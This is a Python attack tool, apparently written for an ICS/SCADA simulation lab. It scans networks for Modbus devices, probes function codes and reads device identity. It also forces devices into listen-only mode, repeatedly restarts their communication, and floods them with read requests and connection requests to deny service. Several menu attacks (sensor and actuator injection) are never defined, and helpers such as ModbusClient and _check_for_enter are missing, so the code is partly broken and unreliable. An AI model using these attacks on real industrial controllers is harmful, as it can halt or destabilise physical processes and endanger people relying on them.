#!/usr/bin/env python3

# FILE:     attacker.py
# PURPOSE:  Provides cyber attacks that can be used to attack any generic ICS/SCADA system. Note
#           that no ICS-specific attacks are generated here. You must implement custom cyber attacks
#           yourself if desired.

import nmap
import random
import numpy as np
from time import sleep
from threading import Thread
from pymodbus.client.sync import ModbusTcpClient, ModbusSerialClient
from pymodbus.mei_message import ReadDeviceInformationRequest
from pymodbus.pdu import ModbusRequest, ExceptionResponse

# constants
LOGO = r"""
  ___ ___ ___     ___ _       _         _       ___     _                 _  _   _           _       
 |_ _/ __/ __|___/ __(_)_ __ | |   __ _| |__   / __|  _| |__  ___ _ _    /_\| |_| |_ __ _ __| |__ ___
  | | (__\__ \___\__ \ | '  \| |__/ _` | '_ \ | (_| || | '_ \/ -_) '_|  / _ \  _|  _/ _` / _| / /(_-<
 |___\___|___/   |___/_|_|_|_|____\__,_|_.__/  \___\_, |_.__/\___|_|   /_/ \_\__|\__\__,_\__|_\_\/__/
                                                   |__/                                                                                             
"""

# globals
scanned_ips = [] # is filled with all modbus ips if the first attacks is executed


# CLASS:    CustomModbusRequest
# PURPOSE:  A subclass of the ModbusRequest class. Used to construct
#           custom modbus requests.
class CustomModbusRequest(ModbusRequest):
    def __init__(self, custom_data=b'', **kwargs):
        ModbusRequest.__init__(self, **kwargs)
        self.custom_data = custom_data

    def encode(self):
        return self.custom_data
    
    def decode(self, data):
        self.custom_data = data



# FUNCTION: create_custom_request
# PURPOSE:  Factory method for creating custom modbus request with specfied function codes.
def create_custom_request(fc):
    class DynamicRequest(CustomModbusRequest):
        pass
    DynamicRequest.function_code = fc
    return DynamicRequest



# FUNCTION: address_scan
# PURPOSE:  Performs an address scan on the given network in CIDR format. The
#           scan identifies hosts running with port 502 open, as this port is used for Modbus
#           TCP communication.
def address_scan(ip_CIDR):
    global scanned_ips

    print("### ADDRESS SCAN ###")
    print(f"Performing an nmap ip scan on network {ip_CIDR} on port 502")

    # initialize the nmap scanner
    nm = nmap.PortScanner()

    # scan the ip(s) on modbus port 502
    nm.scan(ip_CIDR, "502", arguments='-T4')
    print(f"Command ran: {nm.command_line()}")

    # print scan results
    for host in nm.all_hosts():
        print("--------------------------------------------")        
        print(f"Host: {host} ({nm[host].hostname()})")
        print(f"Host State: {nm[host].state()}")
        for proto in nm[host].all_protocols():
            print(f"\tProtocol: {proto}")
            ports = nm[host][proto].keys()
            for port in ports:
                print(f"\tPort: {port}, State: {nm[host][proto][port]['state']}")

                # check if modbus port is open
                if nm[host][proto][port]['state'] == "open":
                    print("\tModbus port 502 is open.")
                    print("It is likely this host is a Modbus Client")
                    scanned_ips.append(nm[host]['addresses']['ipv4'])

    print("### ADDRESS SCAN FINISH ###")



# FUNCTION: function_code_scan
# PURPOSE:  Scans all valid function codes for a list a specified Modbus clients, checking if
#           the function codes work.
def function_code_scan(ip_addresses):
    publicFC = {1,2,3,4,5,6,7,8,11,12,15,16,17,20,21,22,23,24,43}
    userDefFC = {65,66,67,68,69,70,71,72,100,101,102,103,104,105,106,107,108,109,110}
    reservedFC = {9,10,13,14,41,42,90,91,125,126,127}
    allFc = [publicFC, userDefFC, reservedFC]

    print("### FUNCTION CODE SCAN ###")

    # scan ips (Modbus TCP)
    for ip in ip_addresses:
        print(f"===== Performing a function code scan IP {ip} =====")
        print()
        client = ModbusTcpClient(host=ip, port=502)
    
        for fc_set in allFc:
            if 1 in fc_set:
                print("***Scanning public function codes***")
            elif 65 in fc_set:
                print("***Scanning private function codes***")
            else:
                print("***Scanning reserved function codes***")

            for fc in fc_set:
                # send custom pdu request
                CustomFunctionCode = create_custom_request(fc)
                request = CustomFunctionCode(custom_data=b'\x00\x00\x00\x00')
                
                try:
                    response = client.execute(request)
                    if isinstance(response, ExceptionResponse):
                        # check if an illegal function exception (0x01) has occurred
                        if response.exception_code != 1:
                            print(f"Function code {fc} accepted with exception {response.exception_code}")
                    #elif response is None:
                    #    print(f"Function Code {fc}: No response / timeout")
                    else:
                        print(f"Function Code {fc} accepted")
                except Exception as e:
                    print(f"Function Code {fc} accepted with an error")
        print()
        client.close()
    print("### FUNCTION CODE SCAN FINISH ###")



# FUNCTION: device_identification_attack
# PURPOSE:  Uses function code 0x2B to attempt to find device information.
def device_identification_attack(ip_addresses):
    print("### DEVICE IDENTIFICATION ATTACK ###")

    for ip in ip_addresses:
        print(f"===== Performing device identification on {ip} =====")
        client = ModbusTcpClient(host=ip, port=502)
        request = ReadDeviceInformationRequest(read_code=1)
        response = client.execute(request=request)

        # check if device identification is possible
        if response == None:
            print("Modbus client doesn't support function code 0x2B")
        else:
            # extract data from all object types
            print("*** Basic object type data: ***")
            request = ReadDeviceInformationRequest(read_code=1)
            response = client.execute(request=request)
            for k, v in response.information.items():
                print(f"  {k}: {v}")

            print("*** Regular object type data: ***")
            request = ReadDeviceInformationRequest(read_code=1)
            response = client.execute(request=request)
            for k, v in response.information.items():
                print(f"  {k}: {v}")

            print("*** Extended object type data: ***")
            request = ReadDeviceInformationRequest(read_code=1)
            response = client.execute(request=request)
            for k, v in response.information.items():
                print(f"  {k}: {v}")
        print()
        client.close()
    print("### DEVICE IDENTIFICATION ATTACK FINISH ###")



# Function: force_listen_mode
# Purpose: Sends function code 0x08 with sub-function code 0x0004
#   to force a device into Force Listen Mode. Devices that accept this
#   function code will stop responding to Modbus requests.
def force_listen_mode(ip_addresses):
    print("### FORCE LISTEN MODE ###")

    for ip in ip_addresses:
        print(f"Forcing device {ip} into Force Listen Only Mode")
        client = ModbusClient(host=ip, port=502)

        # send custom pdu request for a Force Listen Only Mode request) - function code 08 with subfunction code 04
        pdu = b'\x08\x00\x04\x00\x00'
        response = client.custom_request(pdu)

        # check if exception occurred
        if response == None:
            print(f"Unsuccessful attack: {client.last_except} - {client.last_except_as_full_txt}")
        else:
            print(f"Successful attack!")
        client.close()

    print("### FORCE LISTEN MODE FINISH ###")



# Function: restart_communication
# Purpose: Sends function code 0x08 with sub-function code 0x0001
#   to restart the device. Does this to cause the device to be constantly
#   inactive.
def restart_communication(ip_addresses):
    global stop_looping
    print("### RESTART COMMUNICATION ###")

    for ip in ip_addresses:
        stop_looping = False
        th_stopper = Thread(target=_check_for_enter)
        th_stopper.start()

        print(f"Sending a restart communication request to {ip} in 3 second intervales for 30 seconds")

        client = ModbusClient(host=ip, port=502)
        while not stop_looping:

            # send custom pdu request for a Restart Communcation - function code 08 with subfunction code 01 (device - dependent)
            pdu = b'\x08\x00\x01\x00\x00'
            response = client.custom_request(pdu)

            # check if exception occurred
            if response == None:
                print(f"Unsuccessful attack: {client.last_except} - {client.last_except_as_full_txt}")
            else:
                print(f"Successful attack! Sent Restart Communication packet")
            sleep(3)
        client.close()
            
    print("### RESTART COMMUNICATION FINISH ###")

# Function: data_flood_attack
# Purpose: Floods packets of random read requests to the devices
def data_flood_attack(ip_addresses):
    global stop_looping
    print("### DATA FLOOD ATTACK ###")

    # helper function to flood packets
    def _flood(ip):
        global stop_looping

        client = ModbusTcpClient(host=ip, port=502)
        client.connect()
        while not stop_looping:
            # select random read function code + random address + random num of registers to read
            func_code = random.choice([1, 2, 3, 4])
            address = random.randint(0, 100)
            num_values = random.randint(1, 100)
        
            # Randomly choose some parameters for the request
            if func_code == 1:
                client.read_coils(address=address, count=num_values)
            elif func_code == 2: 
                client.read_discrete_inputs(address=address, count=num_values)
            elif func_code == 3:
                client.read_holding_registers(address=address, count=num_values)
            elif func_code == 4:
                client.read_input_registers(address=address, count=num_values)

    for ip in ip_addresses:
        print(f"Flooding {ip} with random packets from 10 threads for 30 seconds")

        stop_looping = False
        th_stopper = Thread(target=_check_for_enter)
        th_stopper.start()

        for _ in range(1):
            th_flooder = Thread(target=_flood, args=(ip,))
            th_flooder.start()

        while not stop_looping:
            pass # block

    print("### DATA FLOOD ATTACK FINISH ###")

# Function: connection_flood_attack
# Purpose: Floods packets with TCP connection requests
def connection_flood_attack(ip_addresses):
    global stop_looping
    print("### CONNECTION FLOOD ATTACK ###")

    # helper function to flood connection requests
    def _flood_connection(ip):
        global stop_looping

        while not stop_looping:
            client = ModbusTcpClient(host=ip, port=502)
            client.connect()
            #client = ModbusClient(host=ip, port=502)
            sleep(0.01)
            client.close()

    for ip in ip_addresses:
        print(f"Flooding {ip} with connection requests from 10 threads for 30 seconds")

        stop_looping = False
        th_stopper = Thread(target=_check_for_enter)
        th_stopper.start()

        for _ in range(10):
            th_flooder = Thread(target=_flood_connection, args=(ip,))
            th_flooder.start()

        while not stop_looping:
            pass # block

    print("### CONNECTION FLOOD ATTACK FINISH ###")


# Main function
if __name__ == "__main__":
    print(LOGO)

    menuPrompt = """
-----------------------------------------------------------------
| Please select an attack to run against the ICS simulation:    |
|                                                               |
|    Reconnaissance Attacks                                     |
|    (0) - address scan                                         |
|    (1) - function code scan                                   |
|    (2) - device identification attack                         |
|                                                               |
|    Response and Measurement Injection Attacks                 |
|    (3) - naive sensor read                                    |
|    (4) - sporadic sensor measurement injection                |
|    (5) - calculated sensor measure injection                  |
|    (6) - replayed measurement injection                       |
|                                                               |
|    Command Injection Attacks                                  |
|    (7) - altered actuator state                               |
|    (8) - altered control set points                           |
|    (9) - force listen mode                                    |
|    (10) - restart communication                               |
|                                                               |
|    Denial of Service Attacks                                  |
|    (11) - data flood attack                                   |
|    (12) - connection flood attack                             |
-----------------------------------------------------------------

"""

    while True:
        # get user input (only as int)
        selection = -1
        try:
            while selection == -1:
                selection = int(input(menuPrompt))
        except ValueError:
            pass

        # check if any ips have been scanned
        if len(scanned_ips) == 0:
            print("Warning: No IPs scanned. Run an address scan to find Modbus clients")

        # perform cyber attack
        if selection == 0:
            address_scan("192.168.0.0/24")
        elif selection == 1:
            function_code_scan(scanned_ips)
        elif selection == 2:
            device_identification_attack(scanned_ips)
        elif selection == 3:
            naive_sensor_read(scanned_ips)
        elif selection == 4:
            sporadic_sensor_measurement_injection(scanned_ips)
        elif selection == 5:
            calculated_sensor_measure_injection(scanned_ips)
        elif selection == 6:
            replayed_measurement_injection(scanned_ips)
        elif selection == 7:
            altered_actuator_state(scanned_ips)
        elif selection == 8:
            altered_control_set_points(scanned_ips)
        elif selection == 9:
            force_listen_mode(scanned_ips)
        elif selection == 10:
            restart_communication(scanned_ips)
        elif selection == 11:
            data_flood_attack(scanned_ips)
        elif selection == 12:
            connection_flood_attack(scanned_ips)